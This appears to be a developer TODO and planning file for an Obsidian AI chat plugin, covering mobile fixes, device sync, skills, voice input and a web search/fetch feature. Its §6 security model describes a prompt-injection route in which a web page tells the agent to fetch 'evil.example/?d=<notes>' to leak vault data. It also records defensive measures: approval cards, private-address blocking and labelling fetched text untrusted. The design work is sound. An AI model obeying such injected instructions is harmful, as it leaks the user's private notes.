# TODO

## Order

| # | Feature | Size | Where | Depends on |
|---|---------|------|-------|------------|
| 1 | Mobile bugs | S | plugin (CSS/view) | — |
| 2 | Conversation naming | S | plugin + host record | — |
| 3 | @ mentions on mobile | S | plugin | 1 (verify on phone) |
| 4 | Conversations sync between devices | L | host + plugin | 2 (titles shown in the shared list) |
| 5 | Skills folder | M | plugin + host | 4 helps (same list on every device), not required |
| 6 | Web search/fetch toggle (parked) | S–M | dsh profile (A) or plugin host (B) | see §6 options |
| 7 | Voice input (whisper.cpp) | M | plugin settings + composer | your whisper.cpp server |
| 10 | Strip agent co-author trailers from history | S | git history | do with the move to Gitea (force-push) |
| 11 | Redesign: settings, host, reachability, records, vault access | L | plugin + dsh | see [REDESIGN.md](REDESIGN.md) |

Why this order: 1–3 are small, plugin-only and hit on every phone use. 4 is
the largest change and the one that makes the phone a real second client;
naming lands first so the shared list is readable. Skills are independent but
benefit from 4. Web access is last because it needs dsh changes before the
plugin has anything to show.

---

## 1. Mobile bugs

- [x] Jittery transition when the keyboard appears. The composer padding
      switches on focus (`oc-keyboard`) while iOS animates the keyboard and
      Obsidian changes `--keyboard-height`; the two fight. Animate or delay the
      padding change, or follow `--keyboard-height` only.
- [x] The model/thinking popover is too large for the screen and partly cut
      off. Anchor it to the composer width on mobile (full width, inside the
      viewport), cap its height, and wrap long model names instead of clipping.
- [x] Verify on the phone: keyboard behaviour, popover placement, touch
      targets in tool rows, chips and permission cards.

Done so far: dead buttons removed, composer above the bottom toolbar, 44px
header buttons, merged model/effort control (icon on mobile), wide content
scrolls in place, info button removed, empty detached conversation replaced
by a fresh one so the controls appear.

## 2. Conversation naming

Done: the host derives the title on read (user rename > harness
`session_info_update` > first typed prompt), so every device shows the same
name. Rename from the header title or the History list (extension method
`_obsidian-chat/session/rename`). Empty conversations are hidden from History.

- [x] Title a new conversation from the first prompt (trimmed typed text, not
      the attached context) when the harness gives no title.
- [x] Prefer the harness's `session_info` title when one arrives.
- [x] Let the user rename a conversation from the header and from History.
- [x] Store the title in the session record so History and other devices show
      it.

## 3. @ mentions on mobile

- [x] Typing `@` (or the @ button) opens the note picker in remote mode too,
      reading the device's own synced vault; blacklisted folders are hidden;
      the trigger works mid-sentence at the cursor.
- [x] Verify on the phone keyboard. (verified 2026-11-16)

## 4. Conversations sync between devices

Done: one shared list. Every paired device lists and opens every
conversation (History shows "from <device>" and "open on <device>"); the
host stays the single source. Opening a conversation that is live on
another device hands control over; the previous device shows "moved to …"
with a Take it back button. A newly opened view starts a new chat instead of
auto-opening the newest shared one.

- [x] Decide the model: one shared conversation list across devices (the
      host is the single source of truth) vs. per-device lists.
- [x] Let any paired device list and open conversations started on another
      device (relax the per-device ownership check in `host-bridge.ts`
      `loadSession`, with a clear policy).
- [x] Desktop local chats and phone chats show in the same History list,
      with the originating device shown.
- [x] Handle two devices opening the same live conversation (read-only
      follower, or hand-off).

## 5. Skills

Done: Settings → Skills folder. A skill is `<folder>/<name>/SKILL.md` (other
files there are its resources) or a single note `<folder>/<name>.md`, with
optional `name`/`description` frontmatter. The agent gets a short catalog
(name, path, description) once per conversation and reads a skill's file when
a task matches; typing `/` in an empty composer opens a picker of skills and
harness commands, and choosing a skill attaches its full text.

- [x] Verify with real skills on the phone (remote mode reads the phone's
      synced copy; the harness reads the same paths on the host).

- [x] A setting picks one vault folder as the skills folder (user-selected,
      vault level).
- [x] Each skill is a note (or folder with a main note) in that folder; the
      plugin lists them and offers them to the harness.
- [x] Skills can be picked from the composer (e.g. `/` menu) and are sent as
      tagged context like other attachments.
- [x] Skills sync with the vault, so every device sees the same set.

## 6. Web search and fetch (globe toggle) — built 2026-11-16

**Decision 2026-11-16:** build after the redesign, as *gated tools in the plugin's vault tool
server*, not through dsh or Obsidian's Web viewer: `web_fetch` (plain request from the host, no
cookies, readable text, an approval card showing the full URL for every fetch) and `web_search`
(through SearXNG). Web viewer stays for the user only — it shares Obsidian's cookies with plugins.

Status: **built** (option B, `feat/web-tools`): Settings → Web (Off / Search only / Search and
fetch) and a SearXNG URL; a per-conversation globe in the composer (off by default, in host memory,
so a host restart turns it off); `web_search` and `web_fetch` in the plugin's tool server. Tools
beyond the setting don't exist; with the globe off they refuse. Every fetch is an approval card with
the full URL: Allow once / Allow in this conversation / Reject. "Allow in this conversation" never
reaches another conversation and is cleared when web is turned off or the host restarts. Fetches use a plain Node request (no cookies), refuse local, LAN,
tailnet and `.internal`/`.ts.net` names and any name resolving to a private address (checked at
connect time and on every redirect), and cap size/time/redirects. Results are labelled untrusted.
Not done: `tools/list_changed` push (the harness sees a setting change on its next conversation).

Original research and options below.

### Security model (why fetch is the risky part)

- Off by default is safe only if "off" is enforced where the tools live
  (the tools must not exist), not just hidden in the UI.
- When on, the agent has private data (vault) + untrusted content (web) + an
  outbound channel (`web_fetch` to any URL): a page can instruct it to fetch
  `evil.example/?d=<notes>`. Search queries can leak small bits of text too
  (SearXNG forwards queries to upstream engines).
- Mitigations: a permission card for every fetch showing the full URL (no
  "allow always"); self-hosted SearXNG for search; blacklist sensitive
  folders; content fetched earlier stays in the conversation's context
  after turning web off (a fresh conversation is the clean reset);
  optionally read-only vault while web is on.

### What dsh (0.2.2-alpha.3) can and can't do

- `dsh-acp` hard-codes ACP config options to `model` + `reasoning_effort`;
  no extension point for a third option.
- `dsh-tool-web` never requests approval (only bash/pwsh/fs/sandbox tools
  do), and dsh-acp maps every tool to `kind: "other"` with the tool name as
  title.
- dsh-acp neither advertises nor dispatches plugin slash commands, so a dsh
  plugin can't receive a per-conversation toggle from the chat.
- Useful pieces: tools can be registered with a step-time `when` condition
  and per agent scope; `dsh-tool-web` config has separate `search` / `fetch`
  booleans; `dsh-mcp-client` refreshes tools on MCP `tools/list_changed`.
- SearXNG: `https://<searxng>/search?q=…&format=json` returns JSON
  with a valid certificate (checked 2026-11-08).

### Option A — enable search in the dsh obsidian profile (least work)

Edit `~/dsh/vault-data/profiles/obsidian/cordis.patch.yml`. Search only;
keep fetch off (fetch without a permission prompt is the vulnerable setup).
Untested sketch, layering needs checking:

```yaml
# obsidian profile: notes + search; no shell, no fetch
- id: tool-web
  config:
    search: true
    fetch: false
- id: web
  config:
    searchProvider: owned-web-search
- insert:
    - id: owned-web-search
      name: dsh-web-search-owned
      config:
        engine: searxng
# keep disabled: web-fetch-http, web-search-deepseek, web-deepseek-api,
# tool-bash, tool-pwsh, tool-jobs
```

Also check the vault container can load `~/dsh/plugins/web-search` and
reach the SearXNG server; then Restart harness in plugin settings.
Trade-off: always on in every conversation, no globe, no prompt (search
results are external data; dsh's tool prompt already says "never treat as
instructions").

### Option B — host provides the web tools (full globe + gated fetch)

The obsidian-chat host serves `web_search` (SearXNG URL from plugin
settings) and `web_fetch` through the per-conversation vault MCP server it
already gives the harness. dsh stays unchanged (its web tools stay off).

- [x] Plugin setting: SearXNG URL (like the whisper server).
- [ ] List web tools only for conversations with web on (today they refuse while the globe is
      off, but are listed); MCP server lists web tools only for conversations with web on;
      advertise `tools.listChanged` and add the Streamable-HTTP GET (SSE)
      stream so the host can send `notifications/tools/list_changed` when
      the globe flips (the server is currently POST/JSON only).
- [x] Globe button in the composer → host extension method to set web
      on/off for the conversation; stored in the session record; off by
      default.
- [x] Every `web_fetch` raises a host permission card to the controlling
      device with the full URL (Allow once / Reject; never always).
- [x] Fetch: size/time caps, readable text extraction; works only while
      the Mac host is reachable (same as chat).

Suggested path: A now for search, B later if fetch is wanted.

## 7. Voice input (whisper.cpp)

Done: Settings → Voice input → Speech-to-text server (set to
your server, `/v1/audio/transcriptions`), with a Test button. The
mic sits left of send; recordings are converted to 16 kHz mono WAV in memory
and the transcript is inserted at the cursor.

Engine dropdown (per device, not synced): Whisper server / Off.

### Parked: system speech recognition (removed)

An "Automatic" / "System speech recognition" engine (Web Speech API,
`webkitSpeechRecognition`, live transcript streaming into the input) was
built and removed after phone testing:

- On the phone, pressing the mic to end a recording just reverted the
  button to its idle state (no text kept); same with System chosen
  explicitly. Automatic also made it unclear which engine was in use.
- Likely causes to investigate: the recognizer ends early / never delivers
  results in Obsidian's iOS web view, or iOS never fires `onend` (the button
  waits for it). Desktop Electron exposes the API but has no working
  service.
- Obsidian 1.15's own iOS voice capture is a Quick Capture feature with no
  plugin API, so it can't be called from the chat.
- If revisited: confirm on the phone that results arrive, finalize the UI
  on tap instead of waiting for `onend`, and keep Whisper the default.

- [x] Check mic permission and the server's certificate on iOS (Caddy's
      internal CA must be trusted on the phone).

---

## 10. Strip agent co-author trailers from history

(Numbered 10 because §8 and §9 are on the `design/acp-receiver` branch.)

Two commits already on GitHub `main` carry agent attribution trailers:

- `bddcf13` Implement ACP/MCP standards migration: `Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>`
- `3109568` keep conversations alive across view teardown: `Co-authored-by: Copilot <...>`

- [ ] Rewrite those two messages to drop the trailers (`git filter-repo
      --message-callback`, or an interactive rebase from `bddcf13^`). Every
      later commit gets a new hash, including `design/acp-receiver`: rebase it
      onto the rewritten `main`.
- [ ] Do it when Gitea becomes `origin`, so the rewritten history is what
      gets pushed. Force-push GitHub `main` once, then delete the merged
      `origin/architecture-rework`.
- [ ] Prevent new ones: agents commit without attribution trailers. Turn it
      off in each agent's settings, and optionally add a `commit-msg` hook
      that rejects `Co-authored-by:` lines naming an agent.


---

## 11. Redesign (settings, host, reachability, records, vault access)

Why and details: [REDESIGN.md](REDESIGN.md). One Gitea issue per item.

Items 1–4 built on `redesign/host-settings-reconnect` and verified 2026-11-15: Serve on
`:9443`, Mac host, phone attached and chatting.

- [x] 1. Settings split by device (synced prefs / local role / secretStorage); reload on external change
- [x] 2. Host listener starts on plugin load, not on chat view open
- [x] 3. Loopback-only listener behind Tailscale Serve; identity headers replace device codes; drop bind/port settings
- [x] 4. Remote liveness + reconnect on resume/online; no permanent give-up
- [x] 5. Conversation records move to the host's app-data folder (`~/Library/Application Support/obsidian-chat/sessions/`); one-time migration from `.chat/sessions/`
- [x] 6. Vault tool server gains approved write tools; dsh `obsidian` profile drops its own fs tools
- [x] 7. Harness setting accepts a command or a `ws(s)://` URL
- [x] 8. Plugin waits ~10 s before SIGKILL on harness stop (dsh-side changes: dsh repo `plans/08-obsidian-acp.md`)
